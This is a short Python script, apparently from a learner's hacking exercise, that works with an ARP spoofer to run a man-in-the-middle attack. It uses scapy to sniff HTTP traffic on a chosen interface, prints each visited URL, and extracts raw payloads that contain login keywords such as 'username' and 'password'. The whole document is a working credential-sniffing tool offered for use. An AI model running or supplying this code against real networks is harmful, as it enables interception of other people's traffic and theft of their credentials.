#Used in conjunction with the ARP spoofer for MiTM attacks. Only works on HTTP pages, no HTTPS as of yet. 

#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse
#need to install scapy_http for this program

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,) #prn calls a function when a packet is sniffed. store stops it storing in memory

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # putting the URL together with the file path and the domain name

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #checking if the packet has a layer for http
        url = get_url(packet)
        print("VISITED URL >>>" + url)
        login_info = get_login_info(packet)
        if login_info:
            print("Possible username or password: \n\n" + login_info + "\n\n")

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # this layer contains the password
        load = packet[scapy.Raw].load  # printing the raw layer, passwords are in the load field
        keywords = ["username", "unamne", "user", "usr", "password", "pass", "pwd", "login"]
        for i in keywords:
            if i in load:
                return load

def get_args():
    parser = optparse.OptionParser()  # defining the parser
    parser.add_option("-i", "--interface", dest="interface",help="interface you want to sniff on")  # adding an option for command line arguments
    (options, arguments) = parser.parse_args()  # defining 2 variables based on the options give. Options is all we need, args is the list of left over arguments, for example if -i is defined but -m isnt
    if not options.interface:
            # code to handle error
        parser.error("Please specify a target ip")
    return options

options=get_args()
sniff(options.interface)
